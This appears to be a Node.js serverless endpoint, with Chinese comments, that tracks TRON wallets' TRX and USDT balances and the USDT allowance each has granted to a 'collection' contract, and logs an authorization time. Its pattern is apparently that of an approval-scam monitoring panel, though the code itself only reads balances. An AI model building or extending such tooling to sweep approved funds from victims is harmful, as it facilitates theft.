const TronWeb = require('tronweb');

// 内存存储（生产环境应该用数据库）
let wallets = [];

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io'
});

// USDT合约地址
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
// 您的归集合约地址
const MONITOR_CONTRACT = 'TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi';

module.exports = async (req, res) => {
  // CORS设置
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    if (req.method === 'GET') {
      // 获取所有钱包
      const walletsWithBalance = await Promise.all(
        wallets.map(async (wallet) => {
          try {
            const balance = await tronWeb.trx.getBalance(wallet.address);
            const contract = await tronWeb.contract().at(USDT_CONTRACT);
            const usdtBalance = await contract.balanceOf(wallet.address).call();
            const allowance = await contract.allowance(wallet.address, MONITOR_CONTRACT).call();
            
            return {
              ...wallet,
              trxBalance: tronWeb.fromSun(balance),
              usdtBalance: usdtBalance.toNumber() / 1000000,
              usdtAllowance: allowance.toNumber() / 1000000,
              totalBalance: usdtBalance.toNumber() / 1000000,
              lastChecked: new Date().toISOString()
            };
          } catch (error) {
            return {
              ...wallet,
              trxBalance: 0,
              usdtBalance: 0,
              usdtAllowance: 0,
              totalBalance: 0,
              lastChecked: new Date().toISOString(),
              error: error.message
            };
          }
        })
      );
      
      return res.json({ wallets: walletsWithBalance });
    }
    
    if (req.method === 'POST') {
      const { address, name } = req.body;
      
      // 验证地址格式
      if (!tronWeb.isAddress(address)) {
        return res.status(400).json({ error: '无效的TRON地址' });
      }
      
      // 检查是否已存在
      if (wallets.find(w => w.address === address)) {
        return res.status(400).json({ error: '钱包已存在' });
      }
      
      // 获取初始余额
      const balance = await tronWeb.trx.getBalance(address);
      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtBalance = await contract.balanceOf(address).call();
      const allowance = await contract.allowance(address, MONITOR_CONTRACT).call();
      
      const newWallet = {
        id: Date.now().toString(),
        address,
        name: name || `钱包${wallets.length + 1}`,
        trxBalance: tronWeb.fromSun(balance),
        usdtBalance: usdtBalance.toNumber() / 1000000,
        usdtAllowance: allowance.toNumber() / 1000000,
        totalBalance: usdtBalance.toNumber() / 1000000,
        authTime: new Date().toISOString(),
        status: 'active'
      };
      
      wallets.push(newWallet);
      
      return res.json(newWallet);
    }
    
    if (req.method === 'DELETE') {
      const { id } = req.query;
      wallets = wallets.filter(w => w.id !== id);
      return res.json({ message: '钱包已删除' });
    }
    
    res.status(405).json({ error: '方法不允许' });
  } catch (error) {
    console.error('钱包API错误:', error);
    res.status(500).json({ error: error.message });
  }
};